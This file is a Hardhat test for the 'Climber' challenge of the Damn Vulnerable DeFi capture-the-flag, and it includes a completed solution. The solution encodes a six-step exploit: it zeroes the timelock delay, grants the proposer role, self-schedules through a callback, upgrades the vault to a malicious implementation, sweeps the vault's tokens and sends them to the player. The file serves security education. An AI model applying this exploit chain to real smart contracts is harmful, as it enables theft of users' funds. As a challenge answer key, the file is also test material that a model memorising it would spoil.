const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, player;
    let timelock, vault, token;

    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TIMELOCK_DELAY = 60 * 60;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await vault.getSweeper()).to.eq(sweeper.address);
        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await vault.owner();
        timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock delay is correct and cannot be changed
        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');
        
        // Ensure timelock roles are correctly initialized
        expect(
            await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const climberAttacker = await (await ethers.getContractFactory('ClimberAttacker', player)).deploy(timelock.address, token.address);

        const timelockInterface = (await ethers.getContractFactory('ClimberTimelock')).interface;
        const climberAttackerInterface = (await ethers.getContractFactory('ClimberAttacker')).interface;
        const vaultInterface = (await ethers.getContractFactory('ClimberVault')).interface;

        const maliciousClimberVault = await (await ethers.getContractFactory('MaliciousClimberVault', player)).deploy();
        await maliciousClimberVault.connect(player).initialize(climberAttacker.address, climberAttacker.address, climberAttacker.address);

        // Update delay to 0 seconds
        const calldata1 = timelockInterface.encodeFunctionData("updateDelay", [0]);

        // Grant proposer role to the attacker
        const calldata2 = timelockInterface.encodeFunctionData("grantRole", ["0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1", climberAttacker.address]);

        // Callback to schedule everything
        const calldata3 = climberAttackerInterface.encodeFunctionData("callback", []);

        // Upgrade contract
        const calldata4 = vaultInterface.encodeFunctionData("upgradeTo", [maliciousClimberVault.address]);

        // Sweep everything
        const calldata5 = vaultInterface.encodeFunctionData("sweepFunds", [token.address]);

        // transfer tokens to player
        const calldata6 = climberAttackerInterface.encodeFunctionData("transferTokens", [player.address]);

        const targets = [timelock.address, timelock.address, climberAttacker.address, vault.address, vault.address, climberAttacker.address];
        const values = [0, 0, 0, 0, 0, 0];
        const calldata = [calldata1, calldata2, calldata3, calldata4, calldata5, calldata6];
        const salt = ethers.utils.keccak256("0x03");

        await climberAttacker.connect(player).attack(targets, values, calldata, salt);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
